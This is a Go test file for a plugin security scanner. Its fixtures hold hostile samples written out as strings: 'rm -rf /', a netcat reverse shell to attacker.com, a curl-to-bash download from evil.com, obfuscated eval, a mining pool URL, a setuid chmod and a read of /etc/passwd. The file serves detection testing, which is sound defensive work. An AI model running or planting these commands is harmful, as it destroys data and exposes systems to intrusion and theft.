package pluginrunner

import (
	"os"
	"path/filepath"
	"testing"
)

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func TestAnalyzePlugin_CleanPlugin(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import grpc
def on_event(event):
    print("received", event.type)
`)
	writeFile(t, dir, "plugin.yaml", `
name: clean-plugin
version: 1.0.0
entrypoint: python main.py
language: python
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Errorf("expected safe plugin, got %d findings", len(report.Findings))
	}
	if report.TotalFilesScanned != 2 {
		t.Errorf("expected 2 files scanned, got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_ShellExec(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
import os
os.system("rm -rf /")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding")
	}
}

func TestAnalyzePlugin_ReverseShell(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "backdoor.sh", `#!/bin/bash
nc -e /bin/sh attacker.com 4444
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected network critical finding")
	}
}

func TestAnalyzePlugin_Eval(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exploit.py", `
payload = base64.b64decode("aW1wb3J0IG9z")
eval(payload)
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	categories := map[string]bool{}
	for _, f := range report.Findings {
		categories[f.Category] = true
	}
	if !categories["obfuscation"] {
		t.Error("expected obfuscation finding")
	}
}

func TestAnalyzePlugin_CryptoMining(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "miner.js", `
const pool = "stratum+tcp://pool.monero.com:3333";
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "cryptomining" {
			found = true
		}
	}
	if !found {
		t.Error("expected cryptomining finding")
	}
}

func TestAnalyzePlugin_RuntimeInstall(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "setup.sh", `#!/bin/bash
curl https://evil.com/payload.sh | bash
pip install evil-package
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "runtime_install" {
			found = true
		}
	}
	if !found {
		t.Error("expected runtime_install finding")
	}
}

func TestAnalyzePlugin_NetworkWarning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "fetcher.py", `
import requests
resp = requests.get("https://api.anilist.co/graphql")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// network access is WARNING not CRITICAL — plugin is still "safe"
	if !report.Safe {
		t.Error("expected safe plugin (network is warning, not critical)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "network" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected network warning finding")
	}
}

func TestAnalyzePlugin_PrivilegeEscalation(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "escalate.sh", `#!/bin/bash
sudo chmod u+s /usr/bin/something
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin")
	}
}

func TestAnalyzePlugin_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "index.js", `console.log("clean")`)
	writeFile(t, dir, "node_modules/evil/index.js", `eval("malicious")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe — node_modules should be skipped")
	}
	if report.TotalFilesScanned != 1 {
		t.Errorf("expected 1 file scanned (node_modules skipped), got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_SkipsBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin.bin", string([]byte{0x7f, 'E', 'L', 'F'}))
	writeFile(t, dir, "main.py", `print("clean")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.TotalFilesScanned != 1 {
		t.Errorf("expected 1 file scanned (.bin skipped), got %d", report.TotalFilesScanned)
	}
}

func TestAnalyzePlugin_SensitiveFiles(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "exfil.py", `
with open("/etc/passwd") as f:
    data = f.read()
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe — access to /etc/passwd")
	}
}
